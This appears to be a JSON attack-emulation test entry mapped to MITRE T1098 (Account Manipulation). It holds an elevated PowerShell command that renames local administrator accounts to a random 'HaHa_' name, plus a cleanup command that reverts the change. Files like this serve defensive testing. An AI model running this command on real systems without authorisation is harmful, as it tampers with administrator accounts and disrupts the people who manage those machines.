{
    "name": "Admin Account Manipulate",
    "description": "Manipulate Admin Account Name ",
    "supported_platforms": [
        "windows"
    ],
    "executor": {
        "command": "$x = Get-Random -Minimum 2 -Maximum 9999\n$y = Get-Random -Minimum 2 -Maximum 9999\n$z = Get-Random -Minimum 2 -Maximum 9999\n$w = Get-Random -Minimum 2 -Maximum 9999\nWrite-Host HaHa_$x$y$z\n\n$fmm = Get-LocalGroupMember -Group Administrators |?{ $_.ObjectClass -match \"User\" -and $_.PrincipalSource -match \"Local\"} | Select Name\n\nforeach($member in $fmm) {\n    if($member -like \"*Administrator*\") {\n        $account = $member.Name.Split(\"\\\")[-1] # strip computername\\\n        $originalDescription = (Get-LocalUser -Name $account).Description\n        Set-LocalUser -Name $account -Description \"atr:$account;$originalDescription\".Substring(0,48) # Keep original name in description\n        Rename-LocalUser -Name $account -NewName \"HaHa_$x$y$z\" # Required due to length limitation\n        Write-Host \"Successfully Renamed $account Account on \" $Env:COMPUTERNAME\n        }\n    }\n",
        "cleanup_command": "$list = Get-LocalUser |?{$_.Description -like \"atr:*\"}\nforeach($u in $list) {\n  $u.Description -match \"atr:(?<Name>[^;]+);(?<Description>.*)\"\n  Set-LocalUser -Name $u.Name -Description $Matches.Description\n  Rename-LocalUser -Name $u.Name -NewName $Matches.Name\n  Write-Host \"Successfully Reverted Account $($u.Name) to $($Matches.Name) on \" $Env:COMPUTERNAME\n}\n",
        "name": "powershell",
        "elevation_required": true,
        "type": "Command Executor"
    },
    "id": "T1098",
    "tactics": [
        "Persistence",
        "Privilege Escalation"
    ],
    "technique": "Account Manipulation",
    "source": "ART",
    "uuid": "5598f7cb-cf43-455e-883a-f6008c5d46af",
    "arguments": null,
    "preconditions": [],
    "infrastructure_requirement": [],
    "side": "Victim"
}